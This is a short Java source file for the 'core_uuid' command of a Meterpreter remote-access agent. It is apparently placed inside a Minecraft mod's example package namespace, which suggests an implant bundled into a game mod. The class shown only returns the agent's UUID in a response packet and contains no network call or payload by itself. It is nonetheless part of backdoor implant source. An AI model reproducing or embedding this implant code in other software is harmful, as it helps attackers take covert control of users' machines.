package com.example.examplemod.meterpreter.core;

import com.example.examplemod.meterpreter.Meterpreter;
import com.example.examplemod.meterpreter.TLVPacket;
import com.example.examplemod.meterpreter.TLVType;
import com.example.examplemod.meterpreter.Utils;
import com.example.examplemod.meterpreter.command.Command;

import java.io.IOException;

public class core_uuid implements Command {
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        response.add(TLVType.TLV_TYPE_UUID, meterpreter.getUUID());
        return ERROR_SUCCESS;
    }
}

